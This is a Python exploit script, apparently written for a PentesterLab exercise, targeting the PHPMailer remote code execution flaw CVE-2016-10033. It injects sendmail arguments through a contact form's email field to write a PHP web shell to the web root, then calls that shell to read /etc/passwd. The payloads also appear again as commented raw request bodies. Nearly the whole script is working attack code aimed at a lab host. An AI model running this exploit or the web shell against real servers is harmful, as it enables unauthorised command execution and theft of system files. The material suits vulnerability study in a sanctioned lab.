#!/usr/bin/env python3

import requests

# This is based on Pentesterlab's exercise on PHPMailer RCE - CVE-2016-10033
# PHP's implementation of PMPMailer allows for RCE. Read --> https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities

# actual payload --> "attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1
# How it works in Simple Steps
# In a Contact Form - the From field can be injected with the payload defined above. This allows shell commands to be executed
# However, for a web shell in the Subject or Body of the Message, provide the simple PHP Web Shell payload with a GET argument 'c'
# First, look at the parameters from the POST request when you submit the email form. Use those parameters to populate, POST data.
# Since we are using REQUESTS Library here, we need to PREPARE the REQUEST for custom payloads
# In the prepared request send the BODY or DATA of the POST request
# You will need to build 2 request headers --> Content-Length & Content-Type. For former, you need to provide a length value


payload = '"attacker@127.0.0.1\\" -oQ/tmp/ -X/var/www/shell3.php  root"@127.0.0.1'  # Modify to escape \
body = '<?php system($_GET[\'c\']);?>'          # For Web Shell

url = "http://ptl-78cdaee9-2b3aad1d.libcurl.so/"    # Link where the Contact Form

data = "email=" +f"{payload}"+"&subject=random"+"&text="+f"{body}"
#encData = bytes(data,'utf-8')
header = {"Content-Type": "application/x-www-form-urlencoded", "Content-Length":f"{len(data)}"}

req = requests.Request('POST',url,headers=header)
prepared_req = req.prepare()

print("Request Headers")
print(prepared_req.headers)
prepared_req.body = data
print("Request Body")
print(prepared_req.body)

s = requests.session()
try:
    res = s.send(prepared_req)
except Exception as e:
    print(f"Some kind of error occurred. Error is {e}")
finally:
    print("Response is")
    print(res.text)

shell = 'http://ptl-78cdaee9-2b3aad1d.libcurl.so/shell3.php'
arg = {"c" : "cat /etc/passwd"}
rce = requests.Request('GET',shell,params=arg)
rce_prepared = rce.prepare()
print(f"URL For RCE --> {rce_prepared.url}")
v = requests.session()
hack = v.send(rce_prepared)
print(hack.text)




#email="attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell2.php  root"@127.0.0.1&subject=random&text=<?php system($_GET['c']);?>
#email="attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1&subject=testWhite&text=<?php system($_GET['c']);?>
